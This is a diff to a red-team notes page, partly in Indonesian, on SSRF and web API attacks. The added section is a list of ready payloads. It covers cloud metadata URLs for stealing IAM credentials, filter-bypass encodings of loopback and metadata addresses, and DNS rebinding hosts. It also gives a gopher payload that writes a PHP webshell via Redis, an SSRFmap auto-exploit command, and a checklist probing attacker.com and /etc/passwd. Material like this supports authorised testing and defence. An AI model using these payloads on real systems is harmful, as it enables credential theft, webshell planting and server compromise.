@@ -1,12 +1,21 @@
 ---
 title: Attack Perspective — Web API & SSRF (Red Team)
-tags: [attack,red-team,api,ssrf,graphql,rest,imds,oauth]
-source: web-api-ssrf.md
+tags:
+- attack
+- red-team
+- api
+- ssrf
+- graphql
+- rest
+- imds
+- oauth
+created: 2026-08-14
+updated: 2026-08-14
 status: complete
----
 cssclasses:
   - wide-table
   - callout
+---
 
 # Web API & SSRF — Perspektif Penyerang
 
@@ -99,3 +108,101 @@ Result: Account takeover / API access
 - PortSwigger SSRF — https://portswigger.net/web-security/ssrf
 - GraphQL Security — https://github.com/dolevf/Damn-Vulnerable-GraphQL-Application
 - JWT Attack — https://portswigger.net/web-security/jwt
+
+## 7. Payload Konkret — SSRF Bypass Filter (Testable)
+
+### Cloud Metadata (IMDS)
+
+```
+# AWS IMDSv1 (legacy, no auth)
+http://169.254.169.254/latest/meta-data/
+http://169.254.169.254/latest/meta-data/iam/security-credentials/
+http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>/
+
+# GCP
+http://metadata.google.internal/computeMetadata/v1/
+  Header: Metadata-Flavor: Google
+
+# Azure
+http://169.254.169.254/metadata/instance?api-version=2021-02-01
+  Header: Metadata: true
+```
+
+### Localhost Bypass Variants
+
+```
+# IPv4 loopback (semua resolve ke 127.0.0.1)
+http://127.0.0.1:80
+http://127.127.127.127
+http://127.0.1.3
+http://127.1
+http://0
+http://0.0.0.0:80
+
+# IPv6 notation
+http://[::]:80/
+http://[0000::1]:80/
+http://[::ffff:127.0.0.1]
+
+# CIDR loopback (127.0.0.0/8)
+http://127.0.1.3
+http://127.255.255.254
+```
+
+### Encoding Bypass
+
+```
+# Decimal IP (penting: metadata AWS)
+http://2130706433/        = 127.0.0.1
+http://2852039166/        = 169.254.169.254  (AWS metadata!)
+
+# Hex IP
+http://0x7f000001          = 127.0.0.1
+http://0xa9fea9fe          = 169.254.169.254
+
+# Octal IP
+http://0177.0.0.1/         = 127.0.0.1
+
+# Double URL encode
+http://%31%32%37%2e%30%2e%30%2e%31/
+```
+
+### DNS Rebinding (Instant)
+
+```
+# NIP.IO: <apa saja>.<IP>.nip.io → resolve ke IP itu
+http://127.0.0.1.nip.io:80/
+http://company.127.0.0.1.nip.io/
+
+# 2-phase: resolve pertama IP attacker (lolos filter) → kedua 127.0.0.1
+# Tools: rbndr.us, ceye.io, custom DNS server TTL 0
+```
+
+### Gopher → RCE (Redis / FastCGI)
+
+```
+# Redis: tulis webshell ke webroot
+gopher://127.0.0.1:6379/_FLUSHALL%0aSET%20shell%20"%3C%3Fphp%20system(%24_GET['c'])%3B%3F%3E"%0aSAVE%0a
+
+# FastCGI (PHP-FPM RCE)
+gopher://127.0.0.1:9000/_...  (generate dengan Gopherus)
+```
+
+### SSRFmap Exploit (28 Handler)
+
+```bash
+# Fuzz endpoint + auto-exploit ke Redis
+python3 ssrfmap.py -r request.txt -p url -m redis
+
+# Handler tersedia: redis, aws, docker, fastcgi, mysql, postgres,
+#   consul, github, gce, readfiles, portscan, networkscan, smbhash,
+#   smtp, tomcat, zabbix, socksproxy, dll.
+```
+
+### Test Checklist
+
+1. Cek param `url`, `src`, `target`, `redirect`, `path`, `file`
+2. Blind SSRF: gunakan Burp Collaborator / interactsh
+3. Timing: `url=http://attacker.com/slow` → detect via latency
+4. Error-based: `file:///etc/passwd` → response beda
+5. Metadata: selalu test `169.254.169.254` (AWS/Azure/GCP)
